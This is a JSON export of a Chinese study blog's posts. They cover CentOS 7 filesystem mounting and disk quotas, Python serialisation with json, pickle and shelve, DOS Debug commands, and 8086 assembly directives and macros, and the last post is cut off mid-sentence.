[{"title":"基于centos7的linux学习9","url":"%2F2019%2F09%2F17%2F%E5%9F%BA%E4%BA%8Ecentos7%E7%9A%84linux%E5%AD%A6%E4%B9%A09%2F","content":"\n\n\n### 文件系统管理\n\n\n\n#### 创建文件系统\n\n创建文件系统的命令格式：\n\n`mkfs.ext4 <设备名>` 创建 ext4 类型的文件系统\n\n`mkfs.xfs <设备名>` 创建 xfs 类型的文件系统\n\n也可以使用带 -t\\<fstype> 选项的 mkfs 命令创建各种类型的文件系统。\n\n#### 使用 mount 命令挂载文件系统\n\nmount 的命令格式如下：\n\n格式1：`mount [-t<文件系统类型>] [-o<挂载选项>] <设备名> <挂装点>`\n\n- 用于挂载 /etc/fstab 中为列出的文件系统\n- 使用 -t 选项可以指定文件类型\n- 若省略，以此试探 /proc/filesystems 中不包含 nodev 的行\n- 必须同时指定使用<设备名>或<挂装点>\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/1456.png)\n\n格式2：`mount [-o<挂载选项>] <设备名>或<挂装点>` \n\n- 用于挂载 /etc/fstab 中以列出的文件系统\n- 选择使用<设备名>或<挂装点>\n- 若 -o 省略，使用 /etc/fstab 中该文件系统的挂装选项。\n\n格式3：`mount -a  [-t<文件系统类型>] [-o<挂载选项>]`\n\n- 用于挂载 /etc/fstab 中所有不包含 noauto （非自动挂装）挂装选择的文件系统\n- -t 若指定此参数，则只挂装 /etc/fstab 中指定类型的文件系统\n- -o 用于指定挂装 /etc/fstab 中包含指定挂装选项的文件系统\n- 若同时指定 -t 和 -o ，则为或者的关系\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/7864.png)\n\n使用 mount 命令可查看当前挂装的文件系统。\n\n挂装点就是文件系统中的一个目录，必须把文件系统挂装在目录树中的某个目录中。\n\n挂装点目录在实施挂装操作之前必须存在，如其不存在则应该使用 mkidir 命令创建。\n\n通常挂装点目录必须是空的，否则目录中原有文件将内系统隐藏。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/9456.png)\n\n#### 使用 umount 命令卸载文件系统\n\n格式：`umount <设备名或挂装点>`\n\n注：如果一个文件系统处于 busy 状态，则不能卸载该文件系统。\n\n#### fuser 命令\n\nfuser 命令可以根据文件（目录、设备）查找使用它的进程，同时也提供了杀死这些进程的方法。当文件处于 busy 状态时可以使用该命令。\n\n`fuser -cu /mount_point`     查看挂接点有哪些进程需要杀掉\n\n`fuser -ck /mount_point `     杀死这些进程，发送 kill -9 命令\n\n`fuser -c  /mount_point`     查看是否还有进程在访问挂接点\n\n`umount /mount_point`\t       卸载挂接点上的设备\n\n#### 在系统启动时自动挂载文件系统\n\n使用 mount 命令手动挂装的文件系统在关机时会被自动卸载，但系统再次启动时不会被自动挂装，要在启动时自动挂装文件系统必须修改挂装表配置文件 /etc/fstab。\n\n/etc/fstab\t 文件每一行书写一个文件系统的挂装情况，以#开头的行为注释行，文件中每一列的说明如下表：\n\n| 栏名        | 说明                                                         |\n| ----------- | ------------------------------------------------------------ |\n| file system | 要挂装的设备，可以使用设备名，也可以通过 UUID=\\<uuid> 或 LABEL=\\<label> 来指定。 |\n| mount point | 挂装点的目录                                                 |\n| type        | 挂装的文件类型                                               |\n| options     | 挂装选项，挂装设备是可以设置多选项，不同选项间逗号隔开       |\n| dump        | 使用 dump 命令备份文件系统的频率，空白或值为0时，系统认为不需要备份 |\n| pass        | 开机时， fsck 命令会自动检查文件系统 ，pass 规定了检查的顺序。挂装到 / 分区的文件系统，此栏位应是1，其余是2,0表示不需要检查。 |\n\n修改 /etc/fstab 文件后，执行 `mount -a` 使当前修改生效。\n\n注：在 mini 情况下的 centos 需要先执行安装命令`yum install psmisc`，否则不能使用 fuser 命令。\n\n### 磁盘限额\n\n#### 磁盘限额的概念\n\n在一个多用户的系统上，必须限制每个用户的磁盘使用空间，以免个别用户占用过多的磁盘空间影响系统运行或其他用户使用。\n\n磁盘限额是系统管理员用来监控和限制用户或组对磁盘使用的工具，磁盘限额可以从两个方面限制：\n\n1.限制用户或组可以拥有的 inode 数（文件数）\n\n2.限制分配给用户或组的磁盘块的数目（以千字节为单位的磁盘空间）\n\n设置磁盘限额还涉及如下与限制策略相关的3个概念：\n\n- 硬限制：超过此设定值后不能继续存储新的文件\n- 软限制：超过此设定值后仍旧可以继续存储新的文件，同时系统发出警告信息，建议用户清理自己的文件，释放出更多空间。\n- 宽限期：超过软限制多长时间之内（默认7天）可以继续存储新的文件。\n\n#### centos 下的磁盘限额支持\n\n磁盘限额有 linux 的内核支持， centos 提供 cfsold（v1)、vsfv0（v2）、xfs 三种不同的配额支持。\n\n对于 ext3/4 文件系统，磁盘限额的配置和查看工具由 quota 软件包提供，对于 xfs 文件系统，磁盘限额的配置和查看工具由 xfsprogs 软件包的 xfs_quota 提供。\n\nquota 提供的常用的磁盘配额管理工具：\n\n| 工具         | 说明                                                         |\n| ------------ | ------------------------------------------------------------ |\n| quota        | 查看磁盘的使用和限额                                         |\n| requota      | 显示文件系统的磁盘限额汇总信息                               |\n| quotacheck   | 从 /etc/mtab 中扫描支持配额的文件系统、生成、检查、修复限额文件 |\n| edquota      | 使用编辑器编辑用户或组的限额                                 |\n| setquota     | 使用命令行设置用户或组的限额                                 |\n| quotaon      | 启用文件系统的磁盘限额                                       |\n| convertquota | 停用文件系统的磁盘限额                                       |\n| quotastats   | 显示内核的限额统计信息                                       |\n|              |                                                              |\n\n#### 配置磁盘限额\t\n\n在 centos 下配置磁盘限额的步骤如下：\n\n| 配置步骤                                               | ext3 / 4文件系统                                | xfs 文件系统                                                |\n| ------------------------------------------------------ | ----------------------------------------------- | ----------------------------------------------------------- |\n| 编辑 /etc/fstab文件<br />启用文件系统的 quota 挂装选项 | usrquota<br />grpquota                          | uquota<br />gquota                                          |\n| 创建 quota 数据库文件并启用 quota                      | quotacheck -cmvug <文件系统><br />quotaon -avug | xfs 文件系统的 quota 结构信息包含在数据和日志中，无需此步骤 |\n| 设置 quota                                             | 使用 setquota 或 edquota 配置                   | 使用 xfs_quota 配置                                         |\n\nsetquota 命令设置磁盘限额的方法：\n\n| 功能                                     | 命令                                                         |\n| ---------------------------------------- | ------------------------------------------------------------ |\n| 为指定的用户设置配额                     | setquota [-u] <用户名> <块软限制 块硬设置 inode 软设置 inode 硬设置>  < -a 文件系统> |\n| 为指定组的设置配额                       | setquota -g <块软限制 块硬设置 inode 软设置 inode 硬设置>  < -a 文件系统> |\n| 将参考用户的限额设置复制给待设置的新用户 | setquota [-u] -p <参考用户> <新用户> <-a 文件系统>           |\n| 将参考组的限额设置复制给待设置的新组     | setquota -g -p <参考组> <新组> <-a 文件系统>                 |\n| 为指定用户的设置配额宽限期               | setquota -t [-u] <块宽限期 inode 宽限期> <-a 文件系统>       |\n| 为指定组的设置配额时间限期               | setquota -t -g  <块宽限期 inode 宽限期> <-a 文件系统>        |\n\nxfs_quota 命令设置磁盘限额的方法：\n\n| 功能                       | 命令                                                         |\n| -------------------------- | ------------------------------------------------------------ |\n| 为指定的用户设置配额       | xfs_quota -x -c ‘limit -u bsoft=N nhaird=N isoft=N ihard=N <用户名>’ <文件系统> |\n| 为指定组的设置配额         | xfs_quota -x -c ‘limit -u bsoft=N nhaird=N isoft=N ihard=N <组名>’ <文件系统> |\n| 为指定用户的设置配额宽限期 | xfs_quota -x -c ‘timer -u -b <块宽限期>’ <文件系统><br />xfs_quota -x -c ‘timer -u -i <inode 宽限期>’ <文件系统> |\n| 为指定组的设置配额宽限期   | xfs_quota -x -c ‘timer -g -b <块宽限期>’ <文件系统><br />xfs_quota -x -c ‘timer -g -i <inode 宽限期>’ <文件系统> |\n\n| 功能                               | ext3 / 4 文件系统                                            | xfs 文件系统                                                 |\n| ---------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 查看指定用户的配额                 | quota -uv <用户名>                                           | xfs_quota -c ’quota -bi -uv <用户名>‘ <文件系统>             |\n| 查看指定组的配额                   | quota -gv <组名>                                             | xfs_quota -c ’quota -bi -gv <组名>‘ <文件系统>               |\n| 查看所有文件系统的磁盘限额汇总信息 | requota -a<br />requota -au<br />requota -ag                 | xfs_quota -x -c ‘report -a’<br />xfs_quota -x -c ‘report -u -a’<br />xfs_quota -x -c ‘report -g -a’<br /> |\n| 显示指定文件系统的磁盘限额汇总信息 | requota <文件系统><br />requota -u <文件系统><br />requota -g <文件系统> | xfs_quota -x -c report  <文件系统><br />xfs_quota -x -c ’report -u’  <文件系统><br />xfs_quota -x -c ‘report -g’  <文件系统><br /> |\n\n","tags":["linux"]},{"title":"json、pickle模块","url":"%2F2019%2F09%2F16%2Fjson%E3%80%81pickle%E7%AD%89%2F","content":"\n### JSON 模块\n\n#### 序列化的概念\n\n把对象（变量）从内存中变成可存储或传输的过程称为序列化，序列化之后，就可以把序列化的内容写入磁盘或传输到其他的机器上，反过来，把变量内容从序列化的对象重新读到内存称为反序列化。\n\n在 python 中直接打开文件写入集合会报错，需要将其类型转换为字符串。\n\n```python\ndic = {}\nf = open('test','w')\nf.write(dic)    \n#TypeError: write() argument must be str, not dict\n\n\ndic = {}\nf = open('test','w')\nf.write(str(dic))\n```\n\n#### dumps 方法\n\njson 模块的 dumps 方法可以直接将要写入的内容转换成字符串的格式，写入指定文件。\n\n```python\nimport json\ndict = {'name':'alex','age':'12'}\ndata=json.dumps(dict)\nf = open('json_test','w')\nf.write(data)\nf.close()\n```\n\n此时运行程序后，可直接在 json_test 文件中写入 dict 内容，且以字典的格式存储。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/46897.png)\n\n#### dump 方法\n\ndumps 方法需要我们来打开文件，转换数据类型后写入；但是 dump 方法可以省略我们写入和转换的步骤，由该方法自己完成。\n\n格式：`dump(arg1，arg2)` \n\n第一个参数为要写入的内容，第二个参数为文件句柄。参考如下代码：\n\n```python\nimport json\ndict = {'name':'alex','age':'12'}\nf = open('json_test','w')\njson.dump(dict,f)   \nf.close()   \n# data=json.dumps(dict)\n# f.write(data)\n```\n\n#### loads 方法\n\njson 模块的 loads 方法可以直接将要读取的文件内容反序列化后取出，以相同格式的数据类型返回。\n\n```python\nimport json\nf=open('Json_test','r')\ndata=f.read()\ndata=json.loads(data)\nprint(data['name'])  #alex\n```\n\n#### load 方法\n\n与 dump 方法的使用规则类似，参考如下代码：\n\n```python\nimport json\nf = open('json_test','r')\ndata=json.load(f)\nprint(data['name'])  #alex\n```\n\n注：json load 方法有一个 bug，如果所取字典中的键值对是单引号括起来的，就会报错，同样的代码，但是 json_test 文件中的字典如下：\n\n```python\n#{’name‘:‘alex’,‘age’:‘12’}\n\nimport json\nf = open('json_test','r')\ndata=json.load(f)\nprint(data['name'])  \n#json.decoder.JSONDecodeError: Expecting property name enclosed in double quotes: line 1 column 2 (char 1)\n```\n\n### pickle 模块\n\n\n\npickle 模块与 json 模块的功能类似，但是 pickle 模块可处理函数等对象的写入，而 json 不行。\n\n当尝试使用 json.dumps 写入一个函数到文件中时，会报出以下错误：\n\n```python\nimport json\ndef foo():\n\tprint('ok')\nf=open('pickle_test','w')\ndata=json.dumps(foo)  \n#Object of type function is not JSON serializable\nf.write(data)\nf.close()\n```\n\n使用 pickle 模块可以成功执行，将函数写入，pickle 模块是将内容转换为二进制的格式，然后进行文件的写入，所以操作文件时，要设置为 wb  格式。\n\n```python\nimport pickle\ndef foo():\n\tprint('ok')\nf=open('pickle_test','wb')\ndata=pickle.dumps(foo)\nf.write(data)\nf.close\n```\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/55647.png)\n\npickle 存入的文件内容取出时依旧使用 loads 方法，但是不能直接对取出的函数进行调用，因为取出的只是指向内存地址的变量，内存地址已经发生变化。\n\n```python\nimport pickle\nf=open('pickle_test','rb')\ndata=f.read()\ndata=pickle.loads(data)    \n# Can't get attribute 'foo' on <module '__main__' from 'D://xxx\nf.read(data)\nf.close\ndata()\n```\n\n这时如果需要调用，则需要此文件中也有该函数，参考如下代码：\n\n```python\nimport pickle\ndef foo():\n\tprint('ok')\nf=open('pickle_test','rb')\ndata=f.read()\ndata=pickle.loads(data)    \nf.read(data)\nf.close\ndata()   #ok\n```\n\n### shelve 模块\n\n\n\nshelve 模块也可将指定字典内容写入文件中，参见如下代码：\n\n```python\nimport shelve\nf = shelve.open('shelve_test')\nprint(type(f)) #<class 'shelve.DbfilenameShelf'>\nf['info']={'name':'alex','age':'12'}\nf['shoping']={'name':'alex','price':'1000'}\n```\n\n执行后会在当前目录生成三个不同格式的文件，如下：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/123456.png)\n\n存储内容如下：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/234567.png)\n\n取值方式可直接使用字典类型的取值方式，如下：\n\n```python\nimport shelve\nf = shelve.open('shelve_test')\nprint(type(f)) #<class 'shelve.DbfilenameShelf'>\nf['info']={'name':'alex','age':'12'}\nf['shoping']={'name':'alex','price':'1000'}\ndata=f.get('info')\ndata1=f.get('shoping')\nprint(data)\nprint(data1)\n\n{'name': 'alex', 'age': '12'}\n{'name': 'alex', 'price': '1000'}\n#alex\n#male\n```\n\n","tags":["python"]},{"title":"常用Debug命令","url":"%2F2019%2F09%2F15%2F%E5%B8%B8%E7%94%A8Debug%E5%91%BD%E4%BB%A4%2F","content":"\n#### 检查和修改寄存器内容命令 R\n\n格式：`-R [寄存器名|F]`\n\n功能：显示和修改 CPU 中寄存器的内容，或显示或修改标志位的状态\n\n显示 CPU 内所有寄存器内容\n\n使用不带参数的 -R 可以显示 CPU 内容所有寄存器内容。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/4666.png)\n\n显示和修改 CPU 内某个寄存器内容\n\n格式：`-r/R[寄存器名]`\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/566.png)\n\n显示标志位的状态\n\n格式：`-rf/RF`\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/489.png)\n\n各符号的含义如下：\n\n| 表示符号 | 含义 | 表示符号 | 含义 |\n| -------- | ---- | -------- | ---- |\n| OV       | OF=1 | NV       | OF=0 |\n| DN       | DF=1 | UP       | DF=0 |\n| EI       | IF=1 | DI       | IF=0 |\n| NG       | SF=1 | PL       | SF=0 |\n| ZR       | ZF=1 | NZ       | ZF=0 |\n| AC       | AF=1 | NA       | AF=0 |\n| PE       | PF=1 | PO       | PF=0 |\n| CY       | CF=1 | NC       | CF=0 |\n\n#### 显示存储单元命令 D\n\n格式：`-D[地址][地址范围]`\n\n功能：显示指定地址或地址范围内存储单元的内容。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/146.png)\n\n不带参数的 D 命令\n\n如果第一次使用，则显示代码段的内容，如果不是第一次使用，将在上一次显示内容的基础上，显示其后的128个字节单元的内容。\n\n带地址参数的 D 命令\n\n显示指定地址开始的128个字节单元的内容，地址中如果省略段前缀，默认是 DS。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/4598.png)\n\n带地址范围参数的 D 命令\n\n显示指定地址范围内存储单元的内容。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/4596.png)\n\n#### 修改存储单元命令 E\n\n格式：`-E[地址 内容表]`\n\n功能：将指定地址的内存储单元修改为内容表的内容。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/1656.png)\n\n#### 汇编命令 A\n\n格式：`-A[地址]`\n\n功能：该命令允许输入汇编语言，并能把它们汇编成机器代码，相继的存放在从指定地址开始的存储区中，如果不指定汇编地址，则以 CS:IP 为地址。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/4569.png)\n\n#### 反汇编命令 U\n\n格式：`-U[地址][地址范围]`\n\n功能：将指定地址的机器代码翻译成汇编语言指令显示出来，同时显示地址和代码。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/79.png)\n\n#### 命名命令 N\n\n格式：`-N[驱动器][路径]文件名[.扩展名]`\n\n功能：指定要用 L 命令装入内存或用 W 命令写到磁盘的文件的名字。\n\n#### 装入命令 L\n\n格式：`-L[地址][驱动器 扇区号 扇区数]`\n\n功能：把磁盘上的指定文件或指定扇区的内容装入到内存储器从指定开始的地址中，若未指定地址，则从 CS:0100开始。\n\n#### 执行命令 G\n\n格式：`-G[=起始地址][终止地址]`\n\n功能：执行从起始地址开始，到终止地址结束的程序，如果程序能够正确的执行到结束，则显示当前寄存器的执行结果以及下一条要执行的指令。\n\n#### 跟踪运行命令 T\n\n格式：`-T[=起始格式][指令条数]`\n\n功能：从起始地址开始跟踪执行指定条数的指令，每执行一条指令，显示所有寄存器内容，状态标识和下一条要执行的指令。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/799.png)\n\n#### 退出 Debug 命令 Q\n\n格式：`-Q`\n\n功能：退出 Debug，返回 Dos。","tags":["汇编"]},{"title":"伪指令、宏指令","url":"%2F2019%2F09%2F15%2F%E4%BC%AA%E6%8C%87%E4%BB%A4%E3%80%81%E5%AE%8F%E6%8C%87%E4%BB%A4%2F","content":"\n### \t段结构伪指令\n\n汇编语言程序是按段来组织程序和使用存储器的，段结构伪指令的作用是在汇编语言程序中定义逻辑段，指明段的名称、范围、定义类型、组合类型和类别等。\n\n完整端定义由 SEGMENT、ENDS、ASSUME 和 ORG 等。\n\n完整端定义的一般格式如下：\n\n```\n段名  SEGMENT [类型属性列表]\n\t.\n\t.\n段名  ENDS \n```\n\n其中, SEGMENT 表示逻辑段的开始，ENDS 表示逻辑段的结束。\n\n#### 段首伪指令 SEFMENT\n\n该指令标志着一个段的开始，并可以给段赋予边界属性、组合类型、使用类型和类型别名等属性。\n\n格式：`段名 SEFMENT [边界类型] [组合属性] [使用类型] [‘类别名’]`\n\n段名由用户指定，对属性如不指定，采用默认值，若指定，必须按照以上次序。\n\n边界类型：边界类型指明该段装入内容时，对段起始边界的要求。有以下四种。\n\n- BYTE(字节边界)：表示本段从一个字节的边界开始，即任一地址开始。\n- WORD(字边界)：表示本段从一个偶字节的边界开始，所以段的起始地址一定可以被2整除，用二进制表示，最后一位为0。\n- PAPA(节边界)：表示本段从一个小节的边界开始（一个小节为16个字节），所以段的起始地址一定可以被16整除，用二进制表示，最后4位为0。\n- PAGE(页边界)：表示本段从一个页的边界开始，存储器从0号单元开始，每256个字节为一页，所以段的起始地址一定可以被256整除，用二进制表示，最后8位为0。\n\n注：省略边界类型时，默认 PAPA。\n\n合并类型：指示连接程序本段与同段名同类别的其他段合并与否以及合并方式。有以下5种。\n\n- NONE；表示本段与其他段无连接关系，因此在逻辑上是分离的。\n- PUBLIC；连接程序在满足边界类型的前提下，将本段与其他段具有相同段名并且也用 PUBLIC 说明的段放在连续的存储空间中，形成一个新的逻辑段，其长度为各段长度之和。\n- COMMON：产生一个覆盖段，连接程序将相同段名、相同类别的 COMMON 段重叠放置，共享一个存储区，覆盖段的长度是各段最大长度。\n- STACK：用于指定一个堆栈段，连接程序对 STACK 和 PUBLIC 段同样处理，此外还要指示装入程序把合并后的段基址送入 SS ，并将 SP 设置成堆栈段的长度。\n- AT节地址：表示本段可定位在表达式所指定的小节边界上。\n\n类型名：写在一对单引号中的名字，由用户自己选定。\n\n#### 段尾伪指令 ENDS\n\n该伪指令标志着一个段的结束。\n\n格式：`段名 ENDS`\n\n注：段名必须与 SEGMENT 指令中的段名一致。\n\n#### 段寻址伪指令 ASSUME\n\n用来说明各个段寄存器分别装入哪个逻辑段的段起始地址。\n\n格式：`ASSUME 段寄存器名：段名，段寄存器名：段名...`\n\n#### ORG 伪指令\n\n设置其后的指令或数据的起始地址，使指令或数据从指定的偏移地址开始存放。\n\n格式：`ORG 表达式`\n\n注：表达式的值应在 0000H--0FFFFH 之间。\n\n#### 地址计数器 $\n\n表示下一个可用单元的地址。\n\neg：\n\n```\nORG 0050H                 ; 使变量从偏移地址 005H 开始存放\nDATA1 DW 1,2,3,4          \nORG $+30H                 ；使变量从偏移地址 0088H 开始存放\nDATA2 DB 'ABCD'\n```\n\n### 完整端定义结构\n\n典型结构格式如下：\n\n```\n数据段名    SEGMENT         ；数据段开始\n           .\n           .\n数据段名    ENDS\t\t\t；数据段结束\n堆栈段名    SEFMENT\t\t\t；堆栈段开始\n\t\t   .\n           .\n堆栈段名    ENDS\t\t\t；堆栈段结束\n代码段名    SEGMENT\t\t\t；代码段开始\n\t\t   ASSUME ...\t   ；代码段装填\nSTART：    ...\n\t\t   .\n\t\t   .\n\t\t   MOV AH,4CH\n\t\t   INT 21H\t\t    ；返回 DOS\n\t\t   .\n\t\t   .\n代码段名    ENDS\t\t\t ；代码段结束\n\t\t   END START\n```\n\n### 过程定义伪指令 \n\n在程序设计中，通常把一些相对独立的语句序列组成一个过程，供程序调用执行，过程又称为子程序，过程定义伪指令 PROC/ENDP 的格式如下：\n\n```\n过程名  PROC [NEAR|FAR]\n\t   . \n\t   .\t\n\t   RET            ；返回指令\n过程名  ENDP\n```\n\n定义一个过程必须在一个逻辑段中，过程名相当于标号，表示本过程的符号地址，过程有 NEAR 和 FAR 两种，NEAR 类型的过程仅供段内调用，FAR 类型的过程可供段间调用。类型默认 NEAR。\n\n### 模块定义伪指令\n\n#### NAME 伪指令\n\n用于给源程序汇编以后得到的目标程序指定一个模块名，连接目标程序时，将使用该模块名表示目标程序。\n\n格式：`NAME 模块名`\n\n#### TITLE 伪指令\n\n用于给程序指定一个标题，一般不超过60个字符，以后的列表文件会在每一页的每一行显示这个标题。\n\n格式：`TITLE 文本`\n\n#### END 伪指令\n\n指示用标号指定的地址作为程序执行的启动地址。\n\n格式：`END [标号]`\n\n注：如果源程序中没有用 NAME 伪指令指定模块名，则汇编程序将 TITLE 伪指令给出的标题名中前6个字符作为模块名，如果源程序中即无 NAME 伪指令，也无 TITLE 伪指令，则汇编程序将源程序的文件名作为模块名。\n\n### 宏指令\n\n#### 宏指令定义、调用和展开\n\n宏定义 MACRO/ENDM 格式：\n\n```\n宏指令名 MACRO [形参列表]\n\t\t\t.\n\t\t\t.     ; 宏体\n\t\tENDM\n```\n\n在宏定义时，宏指令名必须唯一，允许修改的部分作为形式参数来表示，在宏调用时使用实参代替。\n\n宏调用格式：\n\n`宏指令名 [实参列表]`\n\n宏展开：用宏定义中宏体的目标代码替换宏调用。\n\n#### 宏操作符\n\n连接操作符 &\n\n在宏定义时，&作为形参的前缀或后缀，宏展开时，连接操作符&前后的两个符号连接在一起构成新的符号。\n\neg：\n\n```\nSHIFT_VAR MARCO RM,DIRECT,COUNT\n\t\t  MOV   CL,COUNT\n\t\t  S&DIRECT RM,CL\n\t\t  ENDM\nSHIFT_VAR AX,HL,2\n\nSHIFT_VAR BX,HR,3\n\n两次调用的宏展开分别如下：\n+MOV CL,2\n+SHL AX,CL\n\n+MOV CL,3\n+SHR BX,CL\n```\n\n表达式操作符 %\n\n格式：`%表达式`\n\n在宏调用时，表达式操作符强制后面的表达式立即求值，并将表达式的值作为实参替换。\n\n文本操作符 <>\n\n在宏调用时，若某个实参中包含逗号或空格等间隔符，则必须用文本操作符将该实参括起来，以保证将他作为一个单独的参数而不是多个参数。\n\n字符操作符 ！\n\n格式：`!字符`\n\n指示宏指令在汇编时，把后面的字符当做普通的字符对待，而不使用它的特殊含义。\n\n宏注解符 ;;\n\n格式：`;;文本`\n\n#### LOCAL 伪指令\n\n宏定义中如果包含标号或变量名，且在同一个源程序中调用多次，则在宏展开时，就要产生多个相同的变量名或标号，为了避免这种错误，可在宏定义中使用 LOCAL 伪指令。\n\n格式：`LOCAL <局部符号表>`\n\nLOCAL 指定的变量名或标号在宏展开时会自动生成 ?? XXXX 的符号，XXXX 的范围在 0000H - 0FFFFH。\n\n### 重复汇编\n\n\n\n重复汇编结构有三种，分别使用 REPT、IPR 和 IRPC。\n\n#### REPT/ENDM 伪指令\n\n格式：\n\n```\nREPT 数值表达式\n\t.\n\t.\t\n\tENDM\n```\n\nREPT/ENDM 伪指令指示汇编程序重复执行重复块的指令序列，重复次数由数字表达式的值确定。\n\n#### IRP/ENDM 伪指令\n\n格式：\n\n```\nIPR 形式参数，<实参数>\n\t.\n\t.\n\tENDM\n```\n\nIPR/ENDM 伪指令指示汇编程序使重复块的内容重复多次，重复次数等于实参数的个数。每次重复都用一个实参数替换形式参数，直到用完为止。\n\n#### IRPC/ENDM 伪指令\n\n格式：\n\n```\nIRPC 形式参数，串\n\t.\n\t.\n\tENDM\n```\n\nIRPC/ENDM 伪指令指示汇编程序使重复块的内容重复多次，重复次数等于串中的数字或符号的个数。每次重复用串中的一个数字或符号替换形式参数。如果串中有空格，需要用<>括起来。\n\n### 条件汇编\n\n\n\n根据条件来确定否把一段源代码汇编成对应的目标代码。有以下两种格式：\n\n```\n格式1：\nIFXX 条件\n.\n.       ；语句序列1\nELSE\n.\t\t\n.\t\t；语句序列2\nENDIF\n格式2：\nIFXX 条件\n.\n.\t\t；语句序列\nENDIF \n```\n\n","tags":["汇编"]},{"title":"汇编语言语句","url":"%2F2019%2F09%2F14%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E8%AF%AD%E5%8F%A5%2F","content":"\n### 汇编语言语句分类\n\n语句是汇编语言程序的基本组成单位，有三种常见类型：指令语句、伪指令语句和宏指令语句。\n\n指令语句：在汇编源程序时，每条指令语句都要产生相应的机器语言目标代码，对应着机器的每一天条操作。\n\n伪指令语句：用于指示汇编语言如何对源程序进行汇编工作，伪指令语句的功能在汇编阶段已经全部完成，所以不产生相应的目标代码。\n\n宏指令语句：在不同位置重复执行的多条指令的指令序列，可定义为宏指令，出现时进行宏展开。\n\n汇编语言语句格式：\n\n`[名字] 操作数 [操作数] [；注释]`\n\n每个组成部分之间以空格分隔，含义如下：\n\n名字：\n\n指令语句的名字是标号，必须以冒号“：”结束，标号是一条指令的符号地址，代表该指令代码的起始字节单元地址。\n\n并不是每条指令都需要标号，只有在循环或分支入口语句前面选用标号，以便给循环或转移指令提供转向地址。\n\n伪指令语句中的名字可以是变量名，过程名，段名和符号名等，伪指令语句的名字不可以冒号“：”结束。\n\n汇编语言中名字由数字和字母组成，应满足以下规则：\n\n- 由数字、字母和专有字符组成\n- 数字不能作为第一字符\n- 单独的问号“？”不能作为名字\n- 最大的有效长度为31\n- 保留字不能作为名字使用\n\n操作符：\n\n操作符是各种指令助记符，可以是指令、伪指令和宏指令。\n\n操作数：\n\n不同的指令，伪指令所需的操作数个数不尽相同，需要多个操作数时，各个操作数之间要用逗号或空格分隔。\n\n注释：\n\n注释是以分号“’；”开始的任意字符串，可以写在一条语句后面，也可以独占一行。\n\n### 符号定义语句\n\n等值语句：\n\n格式：`符号名 EQU 表达式`\n\n功能：给表达式或表达式的值赋予一个符号名，定义后，程序中可以用该符号名代表该表达式。\n\n说明：表达式可以是常数、数值表达式、另一个符号名或助记符等。用 EQU 语句定义的符号名在同一个程序中不允许重复定义。\n\n等号语句：\n\n格式：`符号名 = 表达式`\n\n功能：与等值语句的功能基本相同，不同之处在于等号语句中的表达式只能是常数或数值表达式，在同一个程序中可以对一个符号重复定义。\n\n解除定义语句：\n\n格式：`PURGE 符号名1，符号名2...`\n\n功能：解除指定符号的定义。\n\n### 数据定义语句\n\n数据定义伪指令为数据项分配存储单元，用一个符号名与这个存储单元相联系且为这个数据提供一个任选的初始值，也可以只给变量分配存储单元，不进行赋值。\n\n常用的数据定义伪指令有 DB、DW、DD、DQ、DT等。\n\n格式：`[变量名] 数据定义伪指令 初始化参数表`\n\n说明：\n\n如果定义时给出了变量名，则变量名是该数据去的符号地址，在指令中通常利用变量名来引用内存单元。\n\n数据定义伪指令 DB、DW、DD、DQ、DT 所分配的内存单元长度不同，见下表：\n\n| 伪指令 | 内存单元类型  | 单元所占字节数 |\n| ------ | ------------- | -------------- |\n| DB     | BYTE 字节型   | 1              |\n| DW     | WORD 字型     | 2              |\n| DD     | DWORD 双字型  | 4              |\n| DQ     | QWORD 4字型   | 8              |\n| DT     | TBYTE  10字型 | 10             |\n\n初始化参数表可以包含任意个初始化参数，相互之间用逗号“，”隔开，有以下五种形式。\n\n- ? ：仅为变量预留一个存储单元而不对该单元进行初始化。\n\n- 数字常量及数值表达式，可以是十进制、二进制、十六进制和八进制数字常数，也可以是数值表达式。\n- 地址表达式，用在 DW 伪指令中，存入字单元的偏移量部分（用在 DD 伪指令中，双字单元的低字中存放偏移量，高字中存放段基址）。\n- 字符串，字符串必须用单引号或双引号括起来，其值是字符的 ASCII 码值，字符多于两个时，只能用 DB 定义。\n- 重复次数 DUP（初始化参数） ，其中的重复次数可以是任何整数，初始化参数可以是五种形式中的任意一种。\n\n### 汇编语言数据表示与运输符\n\n#### 常数\n\n在汇编中，其值保持不变，分为数字常数和字符常数。\n\n数字常数\n\n在汇编语言程序中，可以有十进制、二进制、十六进制、八进制数字常量。\n\n十进制数以字母 D 结尾，汇编语言中默认十进制。 D 可省略不写。\n\n二进制数以字母 B 结尾；十六进制数以字母 H 结尾，为了区别 A(a)--F(f) ，凡是以此为起始的十六进制数前面必须加上0；八进制数以字母 O 或 Q 结尾。\n\n字符常数\n\n字符常数是用单引号或双引号括起来的一个或多个字符，以 ASCII 